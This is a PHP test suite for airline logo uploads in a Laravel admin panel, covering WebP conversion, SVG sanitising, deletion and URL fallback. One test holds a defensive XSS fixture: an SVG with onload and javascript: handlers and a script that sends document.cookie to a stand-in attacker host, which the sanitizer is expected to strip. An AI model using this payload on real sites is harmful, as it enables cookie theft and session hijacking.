<?php

declare(strict_types=1);

use App\Features\Assets\AssetService;
use App\Filament\Resources\Airlines\Pages\CreateAirline;
use App\Filament\Resources\Airlines\Pages\EditAirline;
use App\Http\Middleware\UpdatePending;
use App\Models\Airline;
use App\Models\Asset;
use Database\Seeders\RolesPermissionsSeeder;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;
use Livewire\Livewire;

beforeEach(function (): void {
    fakeAssetDisks();
    $this->seed(RolesPermissionsSeeder::class);
    $this->withoutMiddleware(UpdatePending::class);
    $this->actingAs(createAdminUser());
});

function airlineWithoutLogo(): Airline
{
    return Airline::factory()->create(['icao' => 'ABC', 'iata' => 'AB', 'country' => 'us', 'logo' => null]);
}

function airlineLogo(Airline $airline): ?Asset
{
    return app(AssetService::class)->find(Asset::SLOT_AIRLINE_LOGO, $airline->icao);
}

/**
 * The upload is edit-only: the asset is keyed on the airline's ICAO, so it is
 * not offered until the airline exists.
 */
it('does not render the logo upload on the create page', function (): void {
    Livewire::test(CreateAirline::class)
        ->assertFormFieldDoesNotExist('logo')
        // The section that wrapped it goes too, rather than leaving a heading.
        ->assertDontSee(__('filament.airline_logo'));
});

/**
 * The logo routes through ImageUploadService like every other admin image
 * upload, so a PNG drop must land as WebP — and it now lands as the airline's
 * `airline-logo` asset rather than a path on the row.
 */
it('converts an uploaded PNG logo to webp and stores it as an asset', function (): void {
    $airline = airlineWithoutLogo();

    Livewire::test(EditAirline::class, ['record' => $airline->id])
        ->set('data.logo', UploadedFile::fake()->image('logo.png', 64, 64));

    $asset = airlineLogo($airline);

    expect($asset)->not->toBeNull()
        ->and($asset->content_type)->toBe('image/webp')
        // Airline marks render on public flight pages, so they are fetched
        // without a session.
        ->and($asset->storage)->toBe(config('filesystems.public_files'));

    Storage::disk($asset->diskName())->assertExists($asset->path);

    // The accessors are the interface every consumer reads, including the ACARS
    // plugin's AirlineData — they must resolve through to the asset.
    $airline->refresh();
    expect($airline->logo_url)->toBe($asset->url())
        ->and($airline->logo_hash)->toBe($asset->last_update);

    // Staging does not keep a copy.
    expect(Storage::disk(Asset::STORAGE_LOCAL)->files(Asset::PATH_PREFIX.'/staging'))->toBeEmpty();
});

/**
 * SVG is resolution-independent and GD cannot rasterise it (NotReadableException
 * on `<svg`), so ImageUploadService keeps it vector rather than attempt a
 * conversion. The drawing itself must survive the sanitizer untouched.
 */
it('keeps an uploaded SVG logo vector and preserves its drawing', function (): void {
    $airline = airlineWithoutLogo();

    $svg = UploadedFile::fake()->createWithContent(
        'logo.svg',
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect width="10" height="10"/></svg>',
    );

    Livewire::test(EditAirline::class, ['record' => $airline->id])->set('data.logo', $svg);

    $asset = airlineLogo($airline);

    expect($asset?->content_type)->toBe('image/svg+xml')
        ->and(Storage::disk($asset->diskName())->get($asset->path))->toContain('<svg');
});

/**
 * An SVG is an XML document the browser executes when its URL is opened
 * directly, so a `<script>` or an `onload=` in an uploaded logo would run with
 * the site's cookies. ImageUploadService::sanitizeSvg() strips those before the
 * bytes are ever stored.
 */
it('strips script and event handlers from an uploaded SVG logo', function (): void {
    $airline = airlineWithoutLogo();

    $svg = UploadedFile::fake()->createWithContent(
        'logo.svg',
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" onload="alert(1)">'
            .'<rect width="10" height="10" onclick="alert(2)"/>'
            .'<script>fetch("https://evil.example/?c=" + document.cookie)</script>'
            .'<a href="javascript:alert(3)"><text>x</text></a>'
            .'</svg>',
    );

    Livewire::test(EditAirline::class, ['record' => $airline->id])->set('data.logo', $svg);

    $asset = airlineLogo($airline);
    $stored = Storage::disk($asset->diskName())->get($asset->path);

    expect($stored)
        ->not->toContain('<script')
        ->not->toContain('evil.example')
        ->not->toContain('onload')
        ->not->toContain('onclick')
        ->not->toContain('javascript:')
        // The drawing still has to come out the other side.
        ->toContain('<rect');
});

/**
 * Fail closed. A file that will not parse as XML is not an SVG, and storing it
 * under a `.svg` name would serve unreviewed bytes as a document.
 */
it('rejects an SVG upload that will not parse as XML', function (): void {
    $airline = airlineWithoutLogo();

    $bad = UploadedFile::fake()->createWithContent('logo.svg', 'this is not xml at all <<<');

    expect(fn () => Livewire::test(EditAirline::class, ['record' => $airline->id])->set('data.logo', $bad))
        ->toThrow(RuntimeException::class);

    expect(airlineLogo($airline))->toBeNull()
        ->and($airline->refresh()->logo_url)->toBeNull();
});

/**
 * Clearing the field removes the mark outright rather than leaving a row
 * pointing at nothing.
 */
it('deletes the asset when the logo is cleared', function (): void {
    $airline = airlineWithoutLogo();

    $component = Livewire::test(EditAirline::class, ['record' => $airline->id])
        ->set('data.logo', UploadedFile::fake()->image('logo.png', 64, 64));

    $stored = airlineLogo($airline);
    expect($stored)->not->toBeNull();

    $component->set('data.logo');

    expect(airlineLogo($airline))->toBeNull();
    Storage::disk($stored->diskName())->assertMissing($stored->path);
});

/**
 * The other way of having a logo. An external URL is not a file we host, so it
 * stays on the column and the accessor falls through to it.
 */
it('keeps resolving an external logo URL from the column', function (): void {
    $airline = Airline::factory()->create([
        'icao'    => 'XYZ',
        'iata'    => 'XY',
        'country' => 'us',
        'logo'    => 'https://cdn.example.com/xyz.png',
    ]);

    expect($airline->logo_url)->toBe('https://cdn.example.com/xyz.png')
        // Not a file we host, so there is nothing to hash.
        ->and($airline->logo_hash)->toBeNull();
});

/**
 * An uploaded mark wins over a stale external URL left on the column, so an
 * airline that had a URL and then got a real upload renders the upload.
 */
it('prefers the asset over an external URL still on the column', function (): void {
    $airline = Airline::factory()->create([
        'icao'    => 'ABC',
        'iata'    => 'AB',
        'country' => 'us',
        'logo'    => 'https://cdn.example.com/old.png',
    ]);

    Livewire::test(EditAirline::class, ['record' => $airline->id])
        ->set('data.logo', UploadedFile::fake()->image('logo.png', 64, 64));

    $asset = airlineLogo($airline);

    expect($airline->refresh()->logo_url)->toBe($asset->url())
        ->and($airline->logo_url)->not->toBe('https://cdn.example.com/old.png');
});

/**
 * The relation is keyed on the ICAO exactly as stored so it can be eager-loaded
 * — a per-row lookup would turn any airline list into an N+1.
 */
it('eager-loads logo assets without a query per airline', function (): void {
    foreach (['AAA', 'BBB', 'CCC'] as $icao) {
        $airline = Airline::factory()->create(['icao' => $icao, 'iata' => substr($icao, 0, 2), 'country' => 'us', 'logo' => null]);

        app(AssetService::class)->storeContents(
            ASSET_TEST_PNG."\x00".$icao,
            Asset::SLOT_AIRLINE_LOGO,
            $airline->icao,
            storage: (string) config('filesystems.public_files'),
        );
    }

    $airlines = Airline::query()->with('logoAsset')->whereIn('icao', ['AAA', 'BBB', 'CCC'])->get();

    DB::enableQueryLog();
    $urls = $airlines->map(fn (Airline $a): ?string => $a->logo_url)->all();
    $queries = DB::getQueryLog();
    DB::disableQueryLog();

    expect($queries)->toBeEmpty()
        ->and(array_filter($urls))->toHaveCount(3)
        // Distinct bytes per airline, so a relation matching the wrong row fails.
        ->and(array_unique($urls))->toHaveCount(3);
});
